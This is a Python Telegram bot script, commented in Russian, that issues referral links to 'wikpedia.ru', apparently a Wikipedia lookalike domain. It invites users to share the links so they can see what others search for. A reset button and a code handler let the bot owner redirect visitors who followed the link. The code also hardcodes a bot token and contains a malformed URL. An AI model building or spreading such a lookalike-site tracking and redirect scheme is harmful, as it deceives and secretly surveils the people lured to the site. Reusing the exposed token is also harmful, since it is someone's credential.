from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
import logging
from datetime import datetime, timedelta
from threading import Lock
import asyncio
import aiohttp

# Настройка логов
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)


BOT_TOKEN = '7953140297:AAGwWVx3zwmo-9MbQ-UUU1764nljCxuncQU'
BASE_SITE_URL = 'https://wikpedia.ru'  # URL вашего Flask-приложения

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ref_link = f"{BASE_SITE_URL}?ref={user_id}"
    
    keyboard = [
        [InlineKeyboardButton("🔗 Перейти на сайт", url=ref_link)],
        [InlineKeyboardButton("🔄 Сбросить всех", callback_data="reset")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"Привет, {update.effective_user.first_name}!\n"
        f"Вот твоя уникальная ссылка:\n{ref_link}\n\n"
        "🔎 Поделись ею, чтобы видеть, что ищут другие!\n"
        "🔄 Нажми 'Сбросить всех', чтобы перенаправить всех на Википедию",
        reply_markup=reply_markup
    )

# reset_callback
async def reset_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await update.callback_query.answer()

    async with aiohttp.ClientSession() as session:
        await session.get(f"{BASE_SITE_URL}/trigger_reset?ref={user_id}")

    await update.callback_query.edit_message_text(
        "🔄 Сброс выполнен! Пользователи скоро будут перенаправлены на Википедию.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔗 Перейти на сайт", url=f"{BASE_SITE_URL}?ref={user_id}")]
        ])
    )

async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = update.message.text.strip()
    
    if not code.isdigit() or len(code) != 4:
        await update.message.reply_text("Пожалуйста, введите 4-значный код.")
        return
    
    ref_link = f"{BASE_SITE_URL}/?ref={user_id}"  # URL основного сайта
    
    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://https://wikicounter.ru//update_code",
            json={'code': code, 'new_url': ref_link}
        ) as response:
            result = await response.json()
            
            if result.get('status') == 'success':
                await update.message.reply_text(
                    "✅ Код принят! Теперь пользователь будет перенаправлен на вашу ссылку.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔗 Перейти на сайт", url=ref_link)]
                    ])
                )
            else:
                await update.message.reply_text("❌ Код не найден или устарел.")


def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(reset_callback, pattern="^reset$"))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code))
    
    application.run_polling(drop_pending_updates=True)



if __name__ == '__main__':
    main()  # Важно! Без этого код не запустится.